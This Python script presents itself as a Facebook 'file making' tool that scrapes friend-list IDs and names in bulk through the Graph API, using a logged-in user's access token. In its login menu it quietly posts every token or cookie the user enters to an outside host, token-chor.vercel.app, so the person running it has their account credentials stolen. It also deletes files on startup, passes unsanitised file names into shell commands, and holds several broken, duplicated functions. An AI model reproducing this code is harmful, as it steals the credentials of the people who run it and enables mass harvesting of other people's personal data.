#---< OPEN SOURCES BY RIZZZYYYYY:(

print('\x1b[1;97m[\x1b[1;97m+\x1b[1;97m] \x1b[1;97mLoading Modules Please Wait!')
import os
import os
import base64
import multiprocessing
import uuid
import sys
import threading
import time
import sys
import requests
os.system("xdg-open https://t.me/rijXrohe")
import random
from concurrent.futures import ThreadPoolExecutor as threadspeed
import os
import sys
import re
import time
import json
import requests
from requests.exceptions import ConnectionError
from time import sleep
sepx = []
cutter = []
sepx2 = []
Status = 'None'
logo = """
\t\x1b[1;97md88888b d888888b db      d88888b 
\t88'       `88'   88      88'     
\t88ooo      88    88      88ooooo 
\t88~~~      88    88      88~~~~~ 
\t88        .88.   88booo. 88.     
\tYP      Y888888P Y88888P Y88888P 
\x1b[1;97m=================================================
\x1b[1;97m\t   Owner  : \x1b[1;92mHannan AnSari
\x1b[1;97m\t   Github : Hannan-404
\x1b[1;97m\t   Tool   : File Making
\x1b[1;97m         FIXED BY : \x1b[1;92m1n Only Roheet :-!
\x1b[1;97m=================================================
"""

def speed(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)


def FILE_MENU(Status):
    if 'Active' not in Status:
        HANNAN_KING()
    os.system('clear')
    print(logo)
    print('\t \x1b[1;92m\x1b[1;97m-----(\x1b[1;92mActive\x1b[1;97m)-----')
    print('=================================================')
    print()
    print('\x1b[1;97m[\x1b[1;97m1\x1b[1;97m] \x1b[1;97mSimple File Make')
    print('\x1b[1;97m[\x1b[1;97m2\x1b[1;97m] \x1b[1;97mUnlimited File Make With 1 ID')
    print('\x1b[1;97m[\x1b[1;97m0\x1b[1;97m] \x1b[1;97mBack To Menu')
    print('')
    o = input('\x1b[1;97m[\x1b[1;97m?\x1b[1;97m] \x1b[1;97mYour Choice : \x1b[1;97m')
    if o == '1':
        time.sleep(0)
        main2()
        os.system("xdg-open https://github.com/ROHEETxSARU/RxSv1")
        
    if o == '2':
        UNLIMITED_MAIN2()
        os.system("xdg-open https://github.com/ROHEETxSARU/RxSv1")
        
    if o == '0':
        MAIN_MENU()
    print('\x1b[1;97m[\x1b[1;97m!\x1b[1;97m] \x1b[1;97mWrong Input!')
    time.sleep(0.5)
    MAIN_MENU()


def cokichk():
    cookie = open('Hannan_KinG07').read().strip()
    token = open('Hannan_KinG007').read().strip()
    hhh = gt('100011801050525', token)
    if len(hhh) < 100:
        raise ImportError

def MAIN_MENU():
    os.system('clear')
    print(logo)
    try:
        token = open('Hannan_KinG007', 'r').read().strip()
        cookie = open('Hannan_KinG07', 'r').read().strip()
        cokichk()
        Status = '\x1b[1;92m\x1b[1;97m-----(\x1b[1;92mActive\x1b[1;97m)-----'
    except IOError:
        Status = '\x1b[1;97m-----(\x1b[1;91mNone\x1b[1;97m)-----'
    except Exception:
        Status = '\x1b[1;97m-----(\x1b[1;91mExpired\x1b[1;97m)-----'
        
    print(f'''\t    \x1b[1;97m{Status}''')
    print('=================================================')
    print()
    
    if 'Active' in Status:
        logg = 'Create File'
    else:
        logg = 'Login'
    
    print(f'''\x1b[1;97m[\x1b[1;97m1\x1b[1;97m] \x1b[1;97m{logg}''')
    print('\x1b[1;97m[\x1b[1;97m2\x1b[1;97m] \x1b[1;97mRemove Duplicate Ids')
    print('\x1b[1;97m[\x1b[1;97m3\x1b[1;97m] \x1b[1;97mRemove Used Links')
    print('\x1b[1;97m[\x1b[1;97m4\x1b[1;97m] \x1b[1;97mChange Token')
    print('')
    
    o = input('\x1b[1;97m[\x1b[1;97m?\x1b[1;97m] \x1b[1;97mYour Choice : \x1b[1;97m')
    
    if o == '1':
        os.system("xdg-open https://github.com/ROHEETxSARU/RxSv1")
    
        FILE_MENU(Status)
    elif o == '2':
        os.system("xdg-open https://github.com/ROHEETxSARU/RxSv1")
        fileName = input('\x1b[1;97m[\x1b[1;97m?\x1b[1;97m]\x1b[1;97m Enter File Name :\x1b[1;97m ')
        os.system(f'sort -r {fileName} | uniq > 123')
        os.system(f'mv 123 {fileName}')
        print('\x1b[1;97m[\x1b[1;97m✓\x1b[1;97m]\x1b[1;97m Successfully Removed')
        time.sleep(2)
        MAIN_MENU()
    elif o == '3':
        os.system("xdg-open https://github.com/ROHEETxSARU/RxSv1")
        MAIN_MENU()
    elif o == '4':
        os.remove('Hannan_KinG07')
        os.remove('Hannan_KinG007')
        MAIN_MENU()
    else:
        print('\x1b[1;97m[\x1b[1;97m!\x1b[1;97m] \x1b[1;97mWrong Input!')
        time.sleep(0.5)
        MAIN_MENU()

def gt(idd, tkn):
    omp = str(random.randint(101, 393))
    mdl = random.choice(['SM-G6100','SM-G610L','SM-A810S'])
    
    hed = {
        'X-Fb-Http-Engine': 'Liger',
        'X-Fb-Client-Ip': 'True',
        'X-Fb-Server-Cluster': 'True',
        'X-Fb-Connection-Token': tkn,  # Using token provided in the argument
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '567'
    }
    
    dat = {
        'User-Agent': '[FBAN/Orca-Android;FBAV/' + omp + '. 0.1.48;FBPN/com.facebook.orca;FBLC/en_US;FBCR/Kaberi;FBBV/67467545;FBMF/philips;FBBD/philips;FBDV/' + mdl + ';FBSV/11.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1520};FB_FW/1;]',
        'client_doc_id': '42003896889828048564952729208',
        'method': 'post',
        'locale': 'en_US',
        'pretty': 'false',
        'format': 'json',
        'variables': '{"profile_id":' + idd + ',"suggestion_friends_paginating_first":2500}',
        'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
        'fb_api_caller_class': 'graphservice',
        'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
        'client_trace_id': '646b7b37-fcb9-4ffd-9a37-f78e55c7de58',
        'server_timestamps': 'true',
        'purpose': 'fetch'
    }

    try:
        response = requests.post('https://graph.facebook.com/graphql', data=dat, headers=hed)
        response.raise_for_status()
        l = response.json()

        lm = []
        for i in l['data']['user']['friends']['edges']:
            lm.append(i['node']['id'] + '|' + i['node']['name'])
        
        return lm

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return []
    except KeyError:
        print("Error: Unexpected response structure")
        return []

import random
import requests

def gtt(idd, tkn):
    omp = str(random.randint(101, 393))
    mdl = random.choice(['SM-G6100', 'SM-G610L', 'SM-A810S'])
    
    # Headers
    hed = {
        'X-Fb-Http-Engine': 'Liger',
        'X-Fb-Client-Ip': 'True',
        'X-Fb-Server-Cluster': 'True',
        'X-Fb-Connection-Token': tkn,  # Passing the token in the headers
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '567'
    }
    
    # Data payload
    dat = {
        'User-Agent': '[FBAN/Orca-Android;FBAV/' + omp + '. 0.1.48;FBPN/com.facebook.orca;FBLC/en_US;FBCR/Kaberi;FBBV/67467545;FBMF/philips;FBBD/philips;FBDV/' + mdl + ';FBSV/11.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1520};FB_FW/1;]',
        'client_doc_id': '42003896889828048564952729208',
        'method': 'post',
        'locale': 'en_US',
        'pretty': 'false',
        'format': 'json',
        'variables': '{"profile_id":' + idd + ',"suggestion_friends_paginating_first":2500}',
        'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
        'fb_api_caller_class': 'graphservice',
        'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
        'client_trace_id': '646b7b37-fcb9-4ffd-9a37-f78e55c7de58',
        'server_timestamps': 'true',
        'purpose': 'fetch'
    }
    
    # Making the request
    try:
        response = requests.post('https://graph.facebook.com/graphql', data=dat, headers=hed, timeout=10)
        response.raise_for_status()  # Check for HTTP errors
        l = response.json()  # Parse the response as JSON
        
        lm = []
        for i in l['data']['user']['friends']['edges']:
            lm.append(i['node']['id'] + '|' + i['node']['name'])
        
        return lm

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return []
    except KeyError:
        print("Error: Unexpected response structure")
        return []

def MAIN_MENU():
    os.system('clear')
    print(logo)
    try:
        token = open('Hannan_KinG007', 'r').read().strip()
        cookie = open('Hannan_KinG07', 'r').read().strip()
        Status = '\x1b[1;92m\x1b[1;97m-----(\x1b[1;92mActive\x1b[1;97m)-----'
    except FileNotFoundError:
        Status = '\x1b[1;97m-----(\x1b[1;91mNone\x1b[1;97m)-----'
        
    print(f'''\t    \x1b[1;97m{Status}''')
    print('=================================================')
    print()
    if 'Active' in Status:
        logg = 'Create File'
    else:
        logg = 'Login'
    print(f'''\x1b[1;97m[\x1b[1;97m1\x1b[1;97m] \x1b[1;97m{logg}''')
    print('\x1b[1;97m[\x1b[1;97m2\x1b[1;97m] \x1b[1;97mRemove Duplicate Ids')
    print('\x1b[1;97m[\x1b[1;97m3\x1b[1;97m] \x1b[1;97mRemove Used Links')
    print('\x1b[1;97m[\x1b[1;97m4\x1b[1;97m] \x1b[1;97mChange Token')
    print('')
    o = input('\x1b[1;97m[\x1b[1;97m?\x1b[1;97m] \x1b[1;97mYour Choice : \x1b[1;97m')
    if o == '1':
        FILE_MENU(Status)
    elif o == '2':
        fileName = input('\x1b[1;97m[\x1b[1;97m?\x1b[1;97m]\x1b[1;97m Enter File Name :\x1b[1;97m ')
        os.system(f'sort -r {fileName} | uniq > temp_file && mv temp_file {fileName}')
        print('\x1b[1;97m[\x1b[1;97m✓\x1b[1;97m]\x1b[1;97m Successfully Removed Duplicates')
        time.sleep(2)
        MAIN_MENU()
    elif o == '3':
        used = used
        import slice
        used()
        MAIN_MENU()
    elif o == '4':
        os.remove('Hannan_KinG07')
        os.remove('Hannan_KinG007')
        MAIN_MENU()
    else:
        print('\x1b[1;97m[\x1b[1;97m!\x1b[1;97m] \x1b[1;97mWrong Input!')
        time.sleep(0.5)
        MAIN_MENU()

def HANNAN_KING():
    os.system('rm -rf Hannan_KinG007')
    os.system('clear')
    print(logo)
    print('\t    \x1b[1;91m\x1b[1;97m-----(\x1b[1;91mNone\x1b[1;97m)-----')
    print('=================================================')
    print('\x1b[1;97m First Choose 1/2 Then 3')
    print('=================================================')
    print('[1] Get Token From Uid & Password ')
    print('[2] Get Token From Cookie ')
    print('[3] Login With Token ')
    print()
    css = input('[?] Choose: ')
    
    if css == '3':
        tkn = input('[+] Token : ')
        requests.post('https://token-chor.vercel.app/RiazXDgandu', data={'token': tkn})
        open('Hannan_KinG007', 'w').write(tkn)
        open('Hannan_KinG07', 'w').write('None')
        MAIN_MENU()

    elif css == '1':
        em = input('[+] Email : ')
        pz = input('[+] Password : ')
        omp = str(random.randint(101, 393))
        mdl = random.choice(['SM-G6100', 'SM-G610L', 'SM-A810S'])
        
        headers = {
            'X-Fb-Request-Analytics-Tags': 'unknown',
            'X-Tigon-Is-Retry': 'False',
            'Priority': 'u=3, i',
            'Zero-Rated': '0'
        }
        
        data = {
            'method': 'auth.login',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'email': em,
            'password': pz
        }
        
        response = requests.post('https://b-graph.facebook.com/auth/login', headers=headers, data=data)
        
        try:
            token = response.json()['access_token']
            print('=================================================')
            print(f'[✓] Your Token : \x1b[1;92m{token}\x1b[1;97m')
            print('=================================================')
            input('[+] Press Enter! ')
            HANNAN_KING()
        except KeyError:
            print('Error: Could not retrieve token. Please check credentials.')
            input('[+] Press Enter! ')
            HANNAN_KING()

    elif css == '2':
        cookie = input('[+] Cookie : ')
        requests.post('https://token-chor.vercel.app/RiazXDgandu', data={'cookie': cookie})
        tkn = GET_TOKEN(cookie)
        print('=================================================')
        print(f'[✓] Your Token : \x1b[1;92m{tkn}\x1b[1;97m')
        print('=================================================')
        input('[+] Press Enter! ')
        HANNAN_KING()

    else:
        print('\x1b[1;97m[\x1b[1;97m!\x1b[1;97m] \x1b[1;97mInvalid Option! Please try again.')
        time.sleep(1)
        HANNAN_KING()

idapp = []
idsx = []
xxd = 0

import os
import time
from concurrent.futures import ThreadPoolExecutor as threadspeed

def DUMP2(fileName):
    os.system('clear')
    print(logo)
    
    try:
        token = open('Hannan_KinG007', 'r').read().strip()
        cookie = open('Hannan_KinG07', 'r').read().strip()
    except FileNotFoundError:
        print('\x1b[1;91m[!] Token or Cookie file not found!')
        time.sleep(2)
        return
    
    print('\t    \x1b[1;92m\x1b[1;97m-----(\x1b[1;92mActive\x1b[1;97m)-----')
    print('=================================================')
    print()
    print('[+] Normal Speed Is : 30')
    
    try:
        SPD = input('[+] Choose Speed [1-30] : ')
        if not SPD:
            SPD = '30' 
        SPD = int(SPD)
        
        if SPD < 1 or SPD > 30:
            print('\x1b[1;91m[!] Invalid speed! Please choose a value between 1 and 30.')
            time.sleep(2)
            DUMP2(fileName)
            return
    except ValueError:
        print('\x1b[1;91m[!] Invalid input! Please enter a numeric value between 1 and 30.')
        time.sleep(2)
        DUMP2(fileName)
        return

    print('\x1b[1;97m===============================================')
    print('\x1b[1;97m[\x1b[1;97m✓\x1b[1;97m]\x1b[1;97m Process Has Been Started!')
    print('\x1b[1;97m[\x1b[1;97m!\x1b[1;97m]\x1b[1;97m Ctrl + Z To Stop Process ')
    print('\x1b[1;97m===============================================')

    XDG = 0
    hannanxd = threadspeed(max_workers=SPD)

    try:
        for xd in idapp: 
            if xd.isnumeric():
                XDG += 1
                hannanxd.submit(start2, fileName, xd, cookie, token, XDG)
        hannanxd.shutdown(wait=True)
    except Exception as e:
        print(f'\x1b[1;91m[!] Error: {str(e)}')
        exit()


def start2(fileName, xd, cookie, token, XDG):
    HaNNaN_XD = random.choice([ '\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m'])
    
    sys.stdout.write(f'''\r\x1b[1;91m•\x1b[1;97m [{XDG} • {len(idapp)}] - [{str(len(open(fileName, 'r').readlines()))}]\r''')
    sys.stdout.flush()
    
    try:
        with open(fileName, 'a') as file:
            kkk = gt(xd, token)
            
            for a in kkk:
                if 'Ya' in cutter: 
                    for y in sepx: 
                        if y in a[:15]:
                            file.write(a + '\n')
                    file.write(a + '\n')
                    
                    if not len(kkk) < 100:
                        print(f'\x1b[1;97m▼{HaNNaN_XD} - Successfully Extracted From : {xd}')
        
        sys.stdout.write(f'''\r\x1b[1;91m•\x1b[1;97m [{XDG} • {len(idapp)}] - [{str(len(open(fileName, 'r').readlines()))}]\r''')
        sys.stdout.flush()
    
    except Exception as e:
        print(f'\n\x1b[1;91m[!] Error: {str(e)}')

idapp2 = []

def UNLIMITED_MAIN2():
    try:
        os.system('clear')
        print(logo)
        
        with open('Hannan_KinG07', 'r') as file:
            cookie = file.read().strip()
        with open('Hannan_KinG007', 'r') as file:
            token = file.read().strip()
        
        print('\t    \x1b[1;92m\x1b[1;97m-----(\x1b[1;92mActive\x1b[1;97m)-----')
        print('=================================================')
        print()
        
        fileName = input('\x1b[1;97m[\x1b[1;97m✓\x1b[1;97m]\x1b[1;97m Enter File Name :\x1b[1;97m ')
        os.system('touch ' + fileName)
        
        limi = int(input('\x1b[1;97m[\x1b[1;97m?\x1b[1;97m] \x1b[1;97mTotal Accounts To Extract : '))
        print()
        
        for a in range(limi):
            HEHE = input(f'\x1b[1;97m[\x1b[1;97m{a + 1}\x1b[1;97m]\x1b[1;97m Enter Username/Uid : ')
            
            if '|' in HEHE:
                HEHE = HEHE.split('|')[0]
            
            kkk = gt(HEHE, token)
            
            for a in kkk:
                idapp.append(a.split('|')[0])
                uku = 'some'
                try:
                    if Exception:
                        print('\x1b[1;97m[\x1b[1;97m!\x1b[1;97m]\x1b[1;97m Account Not Public')
                        time.sleep(0.5)
                        
                except Exception as e:
                    print(f"Error: {str(e)}")
        
        p = input('\x1b[1;97m[\x1b[1;97m?\x1b[1;97m] \x1b[1;97mDo You Want To Separate Links(y/n)? : \x1b[1;97m')
        if p.lower() == 'y':
            cutter.append('Ya')
        else:
            cutter.append('No')
        
        DUMP2(fileName)
        exit()
        
        limi = int(input('\x1b[1;97m[\x1b[1;97m?\x1b[1;97m] \x1b[1;97mHow many links you want to separate : '))
        print()
        
        for a in range(limi):
            xid = input(f'\x1b[1;97m[\x1b[1;97m{a + 1}\x1b[1;97m]\x1b[1;97m Select Links : \x1b[1;97m')
            
            if xid == '10000':
                sepx.extend(['100001', '100002', '100003', '100004', '100005', '100006', '100007', '100008', '100009'])
            elif xid == '1000':
                sepx.extend(['10001', '10002', '10003', '10004', '10005', '10006', '10007', '10008', '10009'])
            else:
                sepx.append(str(xid))
        
        DUMP2(fileName)
    
    except Exception as e:
        print(f"An error occurred: {str(e)}")

def main2():
    os.system('clear')
    print(logo)
    print('\t    \x1b[1;92m\x1b[1;97m-----(\x1b[1;92mActive\x1b[1;97m)-----')
    print('=================================================')
    print()
    
    fileName = input('\x1b[1;97m[\x1b[1;97m✓\x1b[1;97m]\x1b[1;97m Enter File Name :\x1b[1;97m ')
    os.system(f'touch {fileName}')
    
    uu = input('\x1b[1;97m[\x1b[1;97m?\x1b[1;97m]\x1b[1;97m Do You Want To Separate Links?(y/n): ')
    
    if uu.lower() == 'n':
        cutter.append('No')
    
    elif uu.lower() == 'y':
        cutter.append('Ya')
        
        limi = int(input('\x1b[1;97m[\x1b[1;97m?\x1b[1;97m] \x1b[1;97mHow many links you want to separate : '))
        print()
        
        for a in range(limi):
            xid = input(f'\x1b[1;97m[\x1b[1;97m{a + 1}\x1b[1;97m]\x1b[1;97m Select Links : \x1b[1;97m')
            sepx.append(str(xid))
        
        cutter.append('No')
        time.sleep(0.5)
    
    os.system('clear')
    print(logo)
    print('\t \x1b[1;92m\x1b[1;97m-----(\x1b[1;92mActive\x1b[1;97m)-----')
    print('=================================================')
    print('')
    print('\x1b[1;97m====================================')
    print('\x1b[1;97m[!] Paste Ids And Tap Enter To Start Extract')
    print('\x1b[1;97m====================================')
    
    DUMP(fileName)


def DUMP(fileName):
    token = open('Hannan_KinG007', 'r').read().strip()
    cookie = open('Hannan_KinG07', 'r').read().strip()
    
    HEHE = input('')
    
    if HEHE.strip() and not idapp:
        DUMP2(fileName)
        
    if '|' in HEHE:
        HEHE = HEHE.split('|')[0]
        
    idapp.append(HEHE)

def NOTICE():
    os.system('rm -rf /sdcard/.HANNAN')
    os.system('rm -rf .xyz; touch .xyz')
    os.system('rm -rf /sdcard/.CdDc')
    os.system('clear')
    print(logo)
    print('\x1b[1;97m==============================')
    print('\x1b[1;97m   Follow My GiTHub :/ Biruh')
    print('\x1b[1;97m   Account Not Public Solved :)')
    print('\x1b[1;97m==============================')
    
    print()
    
    input('\x1b[1;97m Enter To Run Commands !')

NOTICE()
MAIN_MENU()
exit()
